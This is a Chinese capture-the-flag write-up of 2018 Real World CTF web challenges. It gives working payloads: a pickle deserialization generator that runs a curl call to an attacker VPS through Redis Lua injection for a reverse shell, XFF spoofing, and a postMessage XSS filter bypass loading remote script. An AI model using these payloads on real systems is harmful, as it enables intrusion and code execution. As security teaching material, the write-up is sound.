> 原文链接: https://www.anquanke.com//post/id/153259 


# 2018RealWorld-Web


                                阅读量   
                                **222050**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">9</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t0188ee56a886044aa8.jpg)](https://p2.ssl.qhimg.com/t0188ee56a886044aa8.jpg)

## 前言

恰逢暑假，听说长亭科技出题，于是尝试了一下，写下部分writeup



## Advertisement

[![](https://p0.ssl.qhimg.com/t01f56c4a4297bcd036.png)](https://p0.ssl.qhimg.com/t01f56c4a4297bcd036.png)题目打开有点迷，没有任何东西<br>
下意识的进行文件泄露探测

```
https://realworldctf.com/contest/5b5bc66832a7ca002f39a26b/www.zip
</code></a></pre>
得到flag<br>[![](https://p2.ssl.qhimg.com/t01cd98d888a7ddc1e0.png)](https://p2.ssl.qhimg.com/t01cd98d888a7ddc1e0.png)
 
<h2 name="h2-2" id="h2-2">BookHub</h2>
<p>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012a2cc45998ac8477.png)<br>
拿到题目后发现有源码泄露</p>
<pre><a href="http://52.52.4.252:8080/www.zip"><code class="hljs cpp">http://52.52.4.252:8080/www.zip
</code></a></pre>
<p>下载下来后发现是flask框架写的<br>
简单浏览了一下路由<br>
发现大部分功能都是</p>
<pre><code class="hljs coffeescript">@login_required
```

所以先尝试登陆

```
http://52.52.4.252:8080/login
</code></a></pre>
随手尝试一下，发现<br>[![](https://p1.ssl.qhimg.com/t0110fd434b0dfa1b4b.png)](https://p1.ssl.qhimg.com/t0110fd434b0dfa1b4b.png)于是去跟过滤
<pre><code class="lang-python hljs">@user_blueprint.route('/login/', methods=['GET', 'POST'])
def login():
    form = LoginForm(data=flask.request.data)
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        login_user(user, remember=form.remember_me.data)

        return flask.redirect(flask.url_for('book.admin'))

    return flask.render_template('login.html', form=form)
```

跟到`LoginForm`

```
class LoginForm(FlaskForm):
    username = StringField('username', validators=[DataRequired()])
    password = PasswordField('password', validators=[DataRequired()])
    remember_me = BooleanField('remember_me', default=False)

    def validate_password(self, field):
        address = get_remote_addr()
        whitelist = os.environ.get('WHITELIST_IPADDRESS', '127.0.0.1')

        # If you are in the debug mode or from office network (developer)
        if not app.debug and not ip_address_in(address, whitelist):
            raise StopValidation(f'your ip address isn't in the `{`whitelist`}`.')

        user = User.query.filter_by(username=self.username.data).first()
        if not user or not user.check_password(field.data):
            raise StopValidation('Username or password error.')

```

再跟到`get_remote_addr()`

```
def get_remote_addr():
    address = flask.request.headers.get('X-Forwarded-For', flask.request.remote_addr)

    try:
        ipaddress.ip_address(address)
    except ValueError:
        return None
    else:
        return address
```

发现address来自于`X-Forwarded-For`，若不存在则来自于remote_addr<br>
那么应该是可以使用XFF伪造ip了<br>
我们本地测试一下<br>[![](https://p0.ssl.qhimg.com/t01a464493089f13c49.jpg)](https://p0.ssl.qhimg.com/t01a464493089f13c49.jpg)<br>[![](https://p5.ssl.qhimg.com/t0190fc59593a17df47.jpg)](https://p5.ssl.qhimg.com/t0190fc59593a17df47.jpg)发现是可以伪造的，然而题目却怎么也不行= =（不知道什么鬼）<br>
绝望之际，发现白名单中有一个公网ip

```
18.213.16.123
```

直接打开，是没有http服务的，随手测试了flask的默认端口，有点意思<br>[![](https://p3.ssl.qhimg.com/t0158d89fb927eab100.png)](https://p3.ssl.qhimg.com/t0158d89fb927eab100.png)原来这才是真正的大坑，这里网站直接跑在了debug模式<br>
迅速去看代码里的

```
if app.debug:
```

发现

```
@login_required
@user_blueprint.route('/admin/system/refresh_session/', methods=['POST'])
def refresh_session():
```

我们尝试这个路由<br>[![](https://p1.ssl.qhimg.com/t01326511e58b891d29.png)](https://p1.ssl.qhimg.com/t01326511e58b891d29.png)添加csrf_token<br>[![](https://p1.ssl.qhimg.com/t01d04c8f0d667add4e.png)](https://p1.ssl.qhimg.com/t01d04c8f0d667add4e.png)发现refresh_session()竟然存在未授权访问<br>
（至于为什么[@login_required](https://github.com/login_required)写了还能未授权访问?大概是因为[@login_required](https://github.com/login_required)写在上面了，仔细观察，别的都写在user_blueprint.route下面）<br>
关注到后续代码

```
status = 'success'
        sessionid = flask.session.sid
        prefix = app.config['SESSION_KEY_PREFIX']

        if flask.request.form.get('submit', None) == '1':
            try:
                rds.eval(rf'''
                local function has_value (tab, val)
                    for index, value in ipairs(tab) do
                        if value == val then
                            return true
                        end
                    end

                    return false
                end

                local inputs = `{``{` "`{`prefix`}``{`sessionid`}`" `}``}`
                local sessions = redis.call("keys", "`{`prefix`}`*")

                for index, sid in ipairs(sessions) do
                    if not has_value(inputs, sid) then
                        redis.call("del", sid)
                    end
                end
                ''', 0)
            except redis.exceptions.ResponseError as e:
                app.logger.exception(e)
                status = 'fail'
```

这里明显使用了redis lua,看来是要在session上做文章了<br>
我们发现代码中具有可控点`sessionid`<br>
并且这里存在严重拼接问题<br>
例如<br>[![](https://p1.ssl.qhimg.com/t011d6fcabdc686db26.png)](https://p1.ssl.qhimg.com/t011d6fcabdc686db26.png)我们可以闭合双引号，并引入恶意代码，让redis去执行<br>
(注:f是python3.6的新特性，在2018MeePwnCTF曾出现过一道使用该特性的题目，不再赘述)<br>
我们观察到构造方法

```
local inputs = `{``{` "`{`prefix`}``{`sessionid`}`" `}``}`
```

跟一下

```
prefix = app.config['SESSION_KEY_PREFIX']
```

发现

```
app.config['SESSION_KEY_PREFIX'] = 'bookhub:session:'
```

于是即可构造：

```
6f17c248-ed0d-4d74-bba6-21b9342c854a",redis evilcode,"bookhub:session:skycool
```

[![](https://p1.ssl.qhimg.com/t01a393d45de264abc0.png)](https://p1.ssl.qhimg.com/t01a393d45de264abc0.png)代码拼接后变成

```
$python3 main.py
`{` "bookhub:session:6f17c248-ed0d-4d74-bba6-21b9342c854a",redis evilcode,"bookhub:session:skycool" `}`
```

显而易见，下面我们只需要思考构造`redis evilcode`即可<br>
这里参考ph的两篇文章（当然要参考出题人写过的文章呀XD）

```
[https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html](https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html)
<a href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html
</a>
```

其中ph的两篇文章分别有提到：<br>[![](https://p1.ssl.qhimg.com/t01a4e52d9c1368d21f.png)](https://p1.ssl.qhimg.com/t01a4e52d9c1368d21f.png)<br>[![](https://p1.ssl.qhimg.com/t01a23d96410575d088.png)](https://p1.ssl.qhimg.com/t01a23d96410575d088.png)23333越看越像这道题<br>
既然如此，我们可以给自己构造的一个session赋反弹shell的值，于是构造如下evilcode

```
redis.call("set","bookhub:session:skycool",反弹shell)
```

打完之后将自己的session改为skycool，刷新反弹shell即可<br>
那么开始实操，我们先尝试一下curl

生成反弹shell payload代码如下

```
import cPickle
import os

class exp(object):
    def __reduce__(self):
        s = """curl vps_ip:23333"""
        return (os.system,(s,))

e = exp()
s = cPickle.dumps(e)
s_bypass = ""
for i in s:
    s_bypass +="string.char(%s).."%ord(i)
evilcode = '''
redis.call("set","bookhub:session:skycool",%s)
'''%s_bypass[:-2]
payload = '''
6f17c248-ed0d-4d74-bba6-21b9342c854a",%s,"bookhub:session:skycool
'''%evilcode
print payload.replace(" ","")
```

然后<br>[![](https://p1.ssl.qhimg.com/t010f9a24b8f83db3f3.png)](https://p1.ssl.qhimg.com/t010f9a24b8f83db3f3.png)再[![](https://p1.ssl.qhimg.com/t019af3e22ce9da1290.png)](https://p1.ssl.qhimg.com/t019af3e22ce9da1290.png)然后去登录<br>
发现自己的vps收到访问<br>[![](https://p4.ssl.qhimg.com/t01b82c112a5e434391.png)](https://p4.ssl.qhimg.com/t01b82c112a5e434391.png)<br>
此时眼泪哗的一下流了下来<br>
同理反弹shell即可<br>[![](https://p5.ssl.qhimg.com/t01d1f572ee6221f000.png)](https://p5.ssl.qhimg.com/t01d1f572ee6221f000.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d1df36fe9cdfd54d.png)

## Dot Free

[![](https://p0.ssl.qhimg.com/t011ecd1d0356e1d5a0.png)](https://p0.ssl.qhimg.com/t011ecd1d0356e1d5a0.png)题目乍一看仿佛是SSRF<br>
于是我进行了一些测试，发现ip2long：<br>[![](https://p2.ssl.qhimg.com/t01e243f826a6612442.png)](https://p2.ssl.qhimg.com/t01e243f826a6612442.png)是可以请求的，但是我尝试了自己的vps，根本收不到请求<br>
在迷茫之际，发现源代码中

```
window.addEventListener('message', function (e) `{`
        if (e.data.iframe) `{`
            if (e.data.iframe &amp;&amp; e.data.iframe.value.indexOf('.') == -1 &amp;&amp; e.data.iframe.value.indexOf("//") == -1 &amp;&amp; e.data.iframe.value.indexOf("。") == -1 &amp;&amp; e.data.iframe.value &amp;&amp; typeof(e.data.iframe != 'object')) `{`
                if (e.data.iframe.type == "iframe") `{`
                    lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', e.data.iframe.value], parent);
                `}` else `{`
                    lls(e.data.iframe.value)
                `}`
            `}`
        `}`
    `}`, false);
    window.onload = function (ev) `{`
        postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), '*')
    `}`
```

相当可疑<br>
于是我查阅了一下postMessage

```
https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage
</code></a></pre>
<p>发现<br>[![](https://p3.ssl.qhimg.com/t012f88c53b88d42bb1.png)](https://p3.ssl.qhimg.com/t012f88c53b88d42bb1.png)于是这进一步确实了我的想法<br>
既然确定了问题点，那么肯定是构造payload进行测试<br>
首先确定payload的输入点</p>
<pre><code class="hljs css">decodeURIComponent(location.search.substr(1))
```

即

```
window.location
window的location对象

search
得到的是url中?部分

substr()
返回一个从指定位置开始的指定长度的子字符串
这里设置为1，是为了把url中的?号去掉
```

于是可以确定format为

```
http://13.57.104.34/?payload
```

然后是`JSON.parse`<br>
说明要传入一个json_encode<br>
那么根据题目的意图

```
if (e.data.iframe &amp;&amp; e.data.iframe.value.indexOf('.') == -1 &amp;&amp; e.data.iframe.value.indexOf("//") == -1 &amp;&amp; e.data.iframe.value.indexOf("。") == -1 &amp;&amp; e.data.iframe.value &amp;&amp; typeof(e.data.iframe != 'object'))
```

我们肯定是要bypass这段的，但是我们希望我们构造的payload是可以成功打到自己vps的<br>
但是`//`不能使用，于是想到

```
http:/
```

这样的Bypass<br>
并且不能使用dot，我们还是选择ip2long<br>
然后进入if..else后<br>
我们肯定希望程序进入

```
else `{`
         lls(e.data.iframe.value)
`}`
```

因为

```
function lls(src) `{`
        var el = document.createElement('script');
        if (el) `{`
            el.setAttribute('type', 'text/javascript');
            el.src = src;
            document.body.appendChild(el);
        `}`
    `}`;
```

这样可以把我们的src添加到`document.body`<br>
即可触发恶意操作<br>
于是构造<br>[![](https://p2.ssl.qhimg.com/t017c9ca7c94a310537.png)](https://p2.ssl.qhimg.com/t017c9ca7c94a310537.png)<br>
尝试

```
http://13.57.104.34/?`{`%22iframe%22:`{`%22value%22:%22http:/\2130706433:23333%22`}``}`
```

发现收到回显<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0132f2d77fd0d9f6f9.png)<br>
下一步一气呵成<br>
在自己的index.html中写入<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t010ab663f0f40578b6.png)<br>
然后再请求

```
http://13.57.104.34/?`{`%22iframe%22:`{`%22value%22:%22http:/\2130706433%22`}``}`
```

即可收到<br>[![](https://p4.ssl.qhimg.com/t017c5ba9975fe3ce7b.png)](https://p4.ssl.qhimg.com/t017c5ba9975fe3ce7b.png)



## 后记

我还是太年轻了，尽走弯路= =，感谢巨佬的中途carry，让我学到好多知识Orz
